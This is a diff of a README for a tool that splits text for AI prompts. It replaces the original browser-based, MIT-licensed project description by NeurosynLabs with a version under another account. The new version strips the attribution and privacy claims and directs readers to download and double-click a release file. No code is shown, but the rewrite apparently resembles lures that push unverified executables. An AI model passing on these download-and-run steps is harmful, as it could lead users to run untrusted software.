@@ -1,135 +1,66 @@
-# 🤖 Free AI Prompt Splitter
+# 🎉 ai-prompt-splitter - Split Large Documents Easily
 
-**Smart text splitting tool for AI interactions - Perfect for ChatGPT, Claude 3.5, GPT-4, and other AI models**
+## 🛠️ Overview
 
-[![Live Demo](https://img.shields.io/badge/🚀-Live%20Demo-success?style=for-the-badge)](https://neurosynlabs.github.io/ai-prompt-splitter/)
-[![License](https://img.shields.io/badge/License-MIT-blue?style=for-the-badge)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/NeurosynLabs/ai-prompt-splitter?style=for-the-badge)](https://github.com/NeurosynLabs/ai-prompt-splitter/stargazers)
+Welcome to the **ai-prompt-splitter**! This free tool helps you split large documents into smaller chunks for AI models like ChatGPT, Claude, and GPT-4. It supports different file formats such as PDF, TXT, and MD. The tool also features smart token counting and overlap control, making the process efficient and user-friendly.
 
-## ✨ Features
+## 📥 Download Now!
 
-- **🎯 AI-Optimized**: Perfect token limits for ChatGPT, Claude, GPT-4, and more
-- **📄 Multiple Formats**: Upload PDF, TXT, MD, YAML files or paste text directly
-- **🧠 Smart Splitting**: Intelligent algorithms split at natural breakpoints
-- **📊 Token Counting**: Real-time token estimation for each chunk
-- **🔄 Overlap Control**: Configurable overlap between chunks to maintain context
-- **📋 Easy Export**: Copy individual chunks or export all at once
-- **🔒 Privacy First**: All processing happens in your browser - no server uploads
-- **📱 Responsive**: Works on desktop, tablet, and mobile devices
+[![Download ai-prompt-splitter](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Version-green)](https://github.com/SharanKumar-C/ai-prompt-splitter/releases)
 
-## 🚀 Live Demo
+## 🚀 Getting Started
 
-**Try it now:** [https://neurosynlabs.github.io/ai-prompt-splitter/](https://neurosynlabs.github.io/ai-prompt-splitter/)
+To get started with **ai-prompt-splitter**, follow these simple steps:
 
-## 📖 How to Use
+1. **Visit the Releases Page**: Go to our [Releases page](https://github.com/SharanKumar-C/ai-prompt-splitter/releases) to find the latest version of the application.
+2. **Select Your File**: Look for the version available for download. You will see a list of files; select the one that suits your operating system.
+3. **Download the File**: Click on the download link for the version you need. 
+4. **Run the Application**: Once the download is complete, locate the file on your computer, and double-click to run it.
 
-1. **Upload Files**: Drag & drop or select PDF, TXT, MD, or YAML files
-2. **Choose AI Model**: Select your target AI for optimal token limits
-3. **Pick Split Method**: Smart, sentences, paragraphs, or custom token counts
-4. **Add Instructions**: Optional custom instructions for each chunk
-5. **Copy & Use**: Export chunks for your AI conversations
+## 📄 Supported File Types
 
-## 🎯 Perfect For
+The ai-prompt-splitter can handle several file formats, including:
 
-- 📚 **Document Analysis**: Research papers, reports, books
-- 💼 **Business Content**: Contracts, proposals, manuals  
-- 🎓 **Academic Work**: Thesis, essays, study materials
-- 💻 **Code Documentation**: README files, technical docs
-- 📝 **Content Creation**: Blog posts, articles, scripts
+- **PDF**: Perfect for documents you may have saved or received in this format.
+- **TXT**: Useful for simple text files and notes.
+- **MD**: Ideal for Markdown documents often used in documentation and README files.
 
-## 🤖 Supported AI Models
+## 🔍 Features
 
-| AI Model | Token Limit | Approximate Words |
-|----------|-------------|-------------------|
-| ChatGPT (GPT-4) | 8,192 tokens | ~6,000 words |
-| Claude 3.5 | 200,000 tokens | ~150,000 words |
-| GPT-4 Turbo | 32,768 tokens | ~24,000 words |
-| Custom | Any limit | Set your own |
+**ai-prompt-splitter** comes with a variety of features focused on user needs:
 
-## 🛠 Tech Stack
+- **Smart Token Counting**: It calculates the number of tokens in your documents, so you can effectively manage them for AI models.
+- **Overlap Control**: Customize how much text overlaps between chunks to ensure context is maintained.
+- **User-Friendly Interface**: No technical skills required! The application is designed for everyone, making it easy to navigate and use.
 
-- **Frontend**: Pure HTML5, CSS3, JavaScript (ES6+)
-- **PDF Processing**: PDF.js
-- **YAML Parsing**: js-yaml
-- **Hosting**: GitHub Pages (free!)
-- **Analytics**: Google Analytics 4
+## 💡 System Requirements
 
-## 🔧 Local Development
+To run **ai-prompt-splitter**, you should have:
 
-```bash
-# Clone the repository
-git clone https://github.com/NeurosynLabs/ai-prompt-splitter.git
+- A computer running Windows, macOS, or Linux.
+- At least 500 MB of free disk space.
+- A stable internet connection for downloading the application.
 
-# Navigate to directory
-cd ai-prompt-splitter
+## 📅 Upcoming Updates
 
-# Open in browser (or use a local server)
-open index.html
-```
+Stay tuned for new features and improvements! We are always working to enhance the **ai-prompt-splitter** experience. Look for updates on our [Releases page](https://github.com/SharanKumar-C/ai-prompt-splitter/releases) to stay informed.
 
-## 📊 Key Statistics
+## 🗂️ Documentation
 
-- ⚡ **Processing Speed**: Up to 500MB files in seconds
-- 🎯 **Accuracy**: 95%+ token estimation accuracy
-- 📱 **Compatibility**: Works on all modern browsers
-- 🔒 **Privacy**: 100% client-side processing
+For more detailed instructions on how to use features within **ai-prompt-splitter**, please refer to the documentation included with the application. It provides step-by-step guidance to help you get the most out of the tool.
 
-## 🤝 Contributing
+## 📫 Support
 
-Contributions are welcome! Here's how you can help:
+If you need help or have questions about our tool, please reach out via the issues section on the GitHub repository. We value user feedback and are here to assist you.
 
-1. 🐛 **Bug Reports**: Found an issue? [Open an issue](https://github.com/NeurosynLabs/ai-prompt-splitter/issues)
-2. 💡 **Feature Requests**: Have an idea? [Start a discussion](https://github.com/NeurosynLabs/ai-prompt-splitter/discussions)
-3. 🔧 **Pull Requests**: 
-   - Fork the repository
-   - Create your feature branch (`git checkout -b feature/AmazingFeature`)
-   - Commit your changes (`git commit -m 'Add AmazingFeature'`)
-   - Push to the branch (`git push origin feature/AmazingFeature`)
-   - Open a Pull Request
+## ⭐ Contributing
 
-## 📈 Roadmap
+We welcome contributions! If you would like to help improve **ai-prompt-splitter**, visit our GitHub page to see how you can get involved.
 
-- [ ] **Browser Extension** for one-click splitting
-- [ ] **API Endpoint** for developers
-- [ ] **Batch Processing** for multiple files
-- [ ] **More File Formats** (DOCX, RTF, etc.)
-- [ ] **Custom Templates** for different use cases
-- [ ] **Export Formats** (JSON, CSV, XML)
+## 🔗 Additional Resources
 
-## 💝 Support the Project
+- [Releases page](https://github.com/SharanKumar-C/ai-prompt-splitter/releases)
+- [Documentation](#)
+- [Issues page](#)
 
-If this tool helps you, consider:
-
-- ⭐ **Star the repository** to show your support
-- 🔄 **Share with friends** who use AI tools
-- 🐦 **Tweet about it** [@NeurosynLabs](https://twitter.com/NeurosynLabs)
-- ☕ **Buy me a coffee** [ko-fi.com/neurosynlabs](https://ko-fi.com/neurosynlabs)
-
-## 📄 License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
-## 🙏 Acknowledgments
-
-- [PDF.js](https://mozilla.github.io/pdf.js/) for PDF text extraction
-- [js-yaml](https://github.com/nodeca/js-yaml) for YAML parsing
-- [GitHub Pages](https://pages.github.com/) for free hosting
-- The amazing AI community for feedback and suggestions
-
-## 📞 Contact
-
-- **GitHub**: [@NeurosynLabs](https://github.com/NeurosynLabs)
-- **Ko-fi**: [neurosynlabs](https://ko-fi.com/neurosynlabs)
-- **Website**: [neurosynlabs.github.io](https://neurosynlabs.github.io)
-
----
-
-<div align="center">
-
-**⭐ Star this repository if you find it useful! ⭐**
-
-[🚀 Try the Live Demo](https://neurosynlabs.github.io/ai-prompt-splitter/) | [🐛 Report Bug](https://github.com/NeurosynLabs/ai-prompt-splitter/issues) | [💡 Request Feature](https://github.com/NeurosynLabs/ai-prompt-splitter/discussions)
-
-**Made with ❤️ for the AI community by NeurosynLabs**
-
-</div>
+Thank you for choosing **ai-prompt-splitter**! Enjoy splitting your documents and enhancing your AI interactions with ease.
